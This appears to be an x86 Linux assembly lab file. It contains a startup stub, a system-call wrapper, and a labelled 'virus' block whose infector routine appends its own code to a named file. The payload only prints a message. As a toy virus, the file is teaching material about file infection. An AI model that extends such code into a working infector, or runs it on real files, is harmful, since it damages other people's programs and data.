section .text
global _start
global system_call
global infection
global infector
global code_start
global code_end
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

; ================================================================
; Virus Code Block
; ================================================================

code_start:

infection:
    push    ebp
    mov     ebp, esp
    pushad
    
    ; Calculate the runtime address of the message (Position Independent Code)
    call    .get_my_loc
.get_my_loc:
    pop     ecx             ; Get current instruction pointer
    add     ecx, (msg - .get_my_loc) ; Add offset to reach 'msg'
    
    mov     eax, 4          ; sys_write
    mov     ebx, 1          ; stdout
    ; ecx already contains the pointer to msg
    mov     edx, 21         ; length of "Hello, Infected File\n\0"
    int     0x80
    
    popad
    pop     ebp
    ret

infector:
    push    ebp
    mov     ebp, esp
    pushad
    
    ; open(filename, O_WRONLY | O_APPEND, 0644)
    mov     eax, 5          ; sys_open
    mov     ebx, [ebp+8]    ; filename argument
    mov     ecx, 1025       ; O_WRONLY (1) | O_APPEND (1024)
    mov     edx, 0644o      ; mode
    int     0x80
    
    cmp     eax, 0
    jle     .infect_ret     ; If open failed, exit safely
    
    mov     esi, eax        ; Save file descriptor
    
    ; write(fd, code_start, code_end - code_start)
    mov     eax, 4          ; sys_write
    mov     ebx, esi        ; file descriptor
    mov     ecx, code_start ; start of code to copy
    mov     edx, code_end   ; end of code to copy
    sub     edx, code_start ; calculate length
    int     0x80
    
    ; close(fd)
    mov     eax, 6          ; sys_close
    mov     ebx, esi        ; file descriptor
    int     0x80
    
.infect_ret:
    popad
    pop     ebp
    ret

msg: db "Hello, Infected File", 10, 0

code_end: